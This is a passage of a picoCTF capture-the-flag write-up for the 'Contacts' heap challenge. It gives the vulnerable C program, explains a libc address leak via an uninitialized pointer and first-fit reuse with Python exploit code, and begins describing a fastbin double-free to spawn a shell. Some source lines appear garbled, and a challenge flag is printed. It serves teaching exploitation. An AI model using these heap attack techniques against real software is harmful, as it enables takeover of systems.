# Contacts
Binary Exploitation, 850 points
## Description:
> This program for storing your contacts is currently in beta. Can you hijack control and get a shell?
```c
#include 
#include 
#include 
#define MAX_CONTACTS 16
struct contact {
    char *name;
    char *bio;
};
struct contact *contacts[MAX_CONTACTS];
unsigned int num_contacts = 0;
void print_contacts(){
    for (int i = 0; i bio != NULL){
            printf("%s - %s\n", contacts[i]->name, contacts[i]->bio);
        }else{
            printf("%s - (No bio)\n", contacts[i]->name);
        }
    }
}
struct contact *find_contact(char *name){
    for (int i = 0; i name)){
            return contacts[i];
        }
    }
    return NULL;
}
void create_contact(char *name){
    if (num_contacts == MAX_CONTACTS){
        puts("Too many contacts! Delete one first!");
        return;
    }
    struct contact *contact = (struct contact *)malloc(sizeof(struct contact));
    if (contact == NULL){
        puts("Could not allocate new contact.");
        exit(-1);
    };
    /* make a copy of the name on the heap */
    contact->name = strdup(name);
    if (contact->name == NULL){
        puts("Could not duplicate name.");
        exit(-1);
    }
    contacts[num_contacts++] = contact;
}
void delete_contact(struct contact *contact){
    free(contact->name);
    /* if the bio is set, free it as well */
    if (contact->bio != NULL){
        free(contact->bio);
    }
    free(contact);
    /* replace the corresponding index with the last contact and decrement num_contacts */
    for (int i = 0; i bio != NULL){
        free(contact->bio);
    }
    puts("How long will the bio be?");
    if (fgets(input, 4, stdin) == NULL){
        puts("Couldn't read length.");
        return;
    };
    length = strtoul(input, NULL, 10);
    if (length > 255){
        puts("Bio must be at most 255 characters.");
        return;
    }
    contact->bio = (char *)malloc(length+1);
    if (contact->bio == NULL){
        puts("Couldn't allocate bio.");
        exit(-1);
    }
    puts("Enter your new bio:");
    if (fgets(contact->bio, length+1, stdin) == NULL){
        puts("Couldn't read bio.");
        return;
    }
    puts("Bio recorded.");
}
void menu(){
    puts("Available commands:");
    puts("\tdisplay - display the contacts");
    puts("\tcreate [name] - create a new contact");
    puts("\tdelete [name] - delete an existing contact");
    puts("\tbio [name] - set the bio for an existing contact");
    puts("\tquit - exit the program");
}
int process_cmd(char *cmd){
    struct contact *contact;
    char *name;
    if (!strncmp(cmd, "display", 7)){
        print_contacts();
    }else if (!strncmp(cmd, "create", 6)){
        name = strtok(&cmd[7], "\n");
        if (name == NULL){
            puts("Invalid command");
            return 0;
        }
        create_contact(name);
        printf("Created contact \"%s\"\n", name);
    }else if (!strncmp(cmd, "delete", 6)){
        name = strtok(&cmd[7], "\n");
        if (name == NULL){
            puts("Invalid command");
            return 0;
        }
        contact = find_contact(name);
        if (contact == NULL){
            puts("Can't find contact");
            return 0;
        }
        delete_contact(contact);
        printf("Deleted contact \"%s\"\n", name);
    }else if (!strncmp(cmd, "bio", 3)){
        name = strtok(&cmd[4], "\n");
        if (name == NULL){
            puts("Invalid command");
            return 0;
        }
        contact = find_contact(name);
        if (contact == NULL){
            puts("Can't find contact");
            return 0;
        }
        set_bio(contact);
    }else if (!strncmp(cmd, "quit", 4)){
        return 1;
    }else{
        puts("Invalid option");
        menu();
    }
    return 0;
}
void command_loop(){
    char buf[512];
    menu();
    while(1){
        puts("\nEnter your command:");
        putchar('>'); putchar(' ');
        if(fgets(buf, 512, stdin) == NULL)
            break;
        if (process_cmd(buf)){
            return;
        }
    }
}
int main(int argc, char **argv){
    /* Don't buffer stdout. */
    setbuf(stdout, NULL);
    command_loop();
}
```
Two binary files were attached as well: The executable and libc.so.6.
## Solution:
The program provides a simple contact-management application. We will exploit the application in two stages:
1. Leak a libc address, allowing us to calculate the libc base address
2. Override a function pointer with a magic gadget, and use it to spawn a shell
But first, we have to run the program. Calling it locally provides the following output:
```console
root@kali:/media/sf_CTFs/pico/Contacts# ./contacts
Segmentation fault
```
We will need to make sure it uses the supplied libc when running locally (e.g. by placing both files in the same directory). 
Note: I also had to modify the LD file used by the program, which I took from the server's `/lib64/ld-linux-x86-64.so.2`. This can be done using [PatchELF](https://nixos.org/patchelf.html).
```console
root@kali:/media/sf_CTFs/pico/Contacts# scp PI:EMAIL:/lib64/ld-linux-x86-64.so.2 .
picoCTF{who_n33ds_p4ssw0rds_38dj21}
ld-linux-x86-64.so.2                   100%  159KB  90.1KB/s   00:01
root@kali:/media/sf_CTFs/pico/Contacts# cp contacts contacts_test
root@kali:/media/sf_CTFs/pico/Contacts# ldd contacts
        linux-vdso.so.1 (0x00007ffef2978000)
        libc.so.6 => ./libc.so.6 (0x00007ff4153f7000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ff4157c3000)
root@kali:/media/sf_CTFs/pico/Contacts# ./contacts_test
Segmentation fault
root@kali:/media/sf_CTFs/pico/Contacts# patchelf  --set-interpreter ./ld-linux-x86-64.so.2 ./contacts_test
root@kali:/media/sf_CTFs/pico/Contacts# ldd contacts_test
        linux-vdso.so.1 (0x00007fffb8ffe000)
        libc.so.6 => ./libc.so.6 (0x00007f125c382000)
        ./ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f125c74e000)
root@kali:/media/sf_CTFs/pico/Contacts# ./contacts_test
Available commands:
        display - display the contacts
        create [name] - create a new contact
        delete [name] - delete an existing contact
        bio [name] - set the bio for an existing contact
        quit - exit the program
Enter your command:
```
Now we can move on to locating the bugs in the implementation. The first bug is found in `create_contact`:
```c
struct contact {
    char *name;
    char *bio;
};
[...]
void create_contact(char *name){
    if (num_contacts == MAX_CONTACTS){
        puts("Too many contacts! Delete one first!");
        return;
    }
    struct contact *contact = (struct contact *)malloc(sizeof(struct contact));
    if (contact == NULL){
        puts("Could not allocate new contact.");
        exit(-1);
    };
    /* make a copy of the name on the heap */
    contact->name = strdup(name);
    if (contact->name == NULL){
        puts("Could not duplicate name.");
        exit(-1);
    }
    contacts[num_contacts++] = contact;
}
```
The function allocates a new `struct contact`, but does not initialize the `bio` pointer in any way. This means that `bio` contains garbage, or in our case - specially crafted malicious data. We will use this bug to leak an address of a libc function by taking advantage of [first-fit](https://heap-exploitation.dhavalkapil.com/attacks/first_fit.html) behavior.
1. We take note of `sizeof(contact)`, which is 16.
2. We allocate a bio string of size 16, and populate it so that the last 8 bytes (equivalent to `contact->bio`) contain the address of a libc function.
3. We free the bio. The program does not clear the memory upon free.
4. We request to allocate a new contact. Due to first-fit, `malloc(sizeof(struct contact))` will return the memory which previously was used as our bio string. 
5. Since the `bio` field of the new `contact` structure was not initialized, it contains whatever was there before. In our case, the last 8 bytes contain the address of the libc function.
6. We use the display API to print the contact, which will print the bio string, which will leak the libc function address.
In Python, this translates to:
```python
class Contact(c_struct):
    _fields_ = [('p_name', c_int64),
                ('p_bio', c_int64)]
#Create a fake bio which is crafted to look like a contact struct
bio_as_contact = Contact()
bio_as_contact.p_name = 0;
bio_as_contact.p_bio = e.got["puts"]
create_contact("Leak1")
set_bio("Leak1", bio_as_contact.to_bytes())
free_bio("Leak1")
create_contact("Leak2") # Heap manager will allocate fake bio as Leak2 contact struct
puts_address = u64(get_bio("Leak2").ljust(8, '\x00'))
log.info("Runtime address of puts(): {}".format(hex(puts_address)))
libc_base = puts_address - libc.symbols['puts']
log.info("LibC base: {}".format(hex(libc_base)))
assert (libc_base & 0xFFF == 0)
```
Now, we move on to the second part of the exploit, which attacks fastbin. We will use a [double free](https://heap-exploitation.dhavalkapil.com/attacks/double_free.html) vulnerability together with a [forged chunk](https://heap-exploitation.dhavalkapil.com/attacks/forging_chunks.html) attack. A practical explanation of the attacked can also be found [here](https://sensepost.com/blog/2017/linux-heap-exploitation-intro-series-riding-free-on-the-heap-double-free-attacks/).
A "Double free" can be performed if we have the ability to free the same chunk of memory twice. This means that it will be added to the same "[free list](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks.html)" twice (in our case - the fastbin free list, since we will be dealing with small chunks of memory). We'll see how this can be used in a moment, but first - let's take a look at the vulnerability in `set_bio`:
```c
void set_bio(struct contact *contact){
    [...]
    /* we'll replace the old bio */
    if (contact->bio != NULL){
        free(contact->bio);
    }
    puts("How long will the bio be?");
    if (fgets(input, 4, stdin) == NULL){
        puts("Couldn't read length.");
        return;